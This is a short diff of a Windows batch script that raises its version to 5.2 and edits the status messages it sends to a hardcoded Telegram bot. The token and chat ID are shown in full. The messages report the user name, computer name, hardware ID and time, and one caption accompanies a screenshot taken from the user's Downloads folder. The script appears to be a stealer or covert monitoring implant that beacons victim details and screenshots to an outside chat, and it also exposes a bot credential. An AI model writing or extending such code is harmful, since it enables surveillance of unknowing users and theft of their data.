@@ -9,7 +9,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=5.1"
+set "BATCHVERSION=5.2"
 
 
 
@@ -1232,7 +1232,7 @@ echo.
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|RUNNING(v%BATCHVERSION%).....|%time%"
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|RUNNING.....|%time%|(v%BATCHVERSION%)"
 
 
 :: URL encode the message by replacing spaces with %20
@@ -1445,7 +1445,7 @@ echo.
 :: Set bot token, chat ID, and caption
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "CAPTION=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|%MESSAGE%%time%"
+set "CAPTION=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|%MESSAGE%%time%|(v%BATCHVERSION%)"
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 :: URL encode the caption
